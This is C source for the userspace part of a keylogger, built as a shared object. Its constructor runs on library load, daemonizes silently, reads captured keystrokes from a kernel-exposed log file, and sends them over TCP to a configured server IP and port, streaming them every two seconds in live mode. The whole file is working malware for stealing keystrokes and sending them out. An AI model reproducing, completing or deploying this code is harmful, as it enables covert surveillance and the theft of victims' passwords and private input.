// Userspace helper to read the keylogger log and send to server
// TODO: Add option to send keys on every file change and not only once - The reason this is a shared object
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <signal.h>
#include "config.h"

#define SUCCESS 0
#define ERROR 1

static void daemonize()
{
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS); // parent exits

    if (setsid() < 0) exit(EXIT_FAILURE);

    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    umask(0);
    chdir("/");

    for (int i = 0; i < 3; i++)
        close(i);
}

static int send_keylogs(const char *data, size_t len)
{
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    struct sockaddr_in serv_addr = {
        .sin_family = AF_INET,
        .sin_port = htons(KEYLOG_PORT),
    };

    if (inet_pton(AF_INET, KEYLOG_SERVER_IP, &serv_addr.sin_addr) <= 0)
    {
        close(sock);
        return -ERROR;
    }

    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0)
    {
        close(sock);
        return -ERROR;
    }

    send(sock, data, len, 0);
    close(sock);
    return SUCCESS;
}

static int connect_to_server()
{
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    struct sockaddr_in serv_addr = {
        .sin_family = AF_INET,
        .sin_port = htons(KEYLOG_PORT),
    };

    if (inet_pton(AF_INET, KEYLOG_SERVER_IP, &serv_addr.sin_addr) <= 0)
    {
        close(sock);
        return -ERROR;
    }

    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0)
    {
        close(sock);
        return -ERROR;
    }

    return sock;
}

__attribute__((constructor))
static void init_keylog_exfil()
{
    daemonize();

    if (!IS_LIVE)
    {
        char buf[BUFFER_SIZE];
        FILE *f = fopen(KEYLOG_PATH, "r");
        if (!f) return;

        size_t len = fread(buf, 1, BUFFER_SIZE - 1, f);
        fclose(f);

        buf[len] = '\0';
        DBG_PRINT("Read %zu bytes from /proc/keylog\n", len);
        DBG_PRINT("%s\n", buf);

        if (len > 0)
            send_keylogs(buf, len);
    }
    else
    {
        // int fd = open(KEYLOG_PATH, O_RDONLY | O_NONBLOCK);
        int fd = open(KEYLOG_PATH, O_RDONLY);
        if (fd < 0) return;             

        int sock = -1;
        char buf[BUFFER_SIZE];

        while (1) {
            int fd = open(KEYLOG_PATH, O_RDONLY);
            if (fd < 0) {
                sleep(2);
                continue;
            }
        
            ssize_t len = read(fd, buf, sizeof(buf) - 1);
            close(fd);
        
            if (len > 0) {
                buf[len] = '\0';
                if (sock < 0)
                    sock = connect_to_server();
                if (sock >= 0)
                    send(sock, buf, len, 0);
            }
            sleep(2);
        }
        if (sock >= 0)
            close(sock);
        close(fd);
    }
}
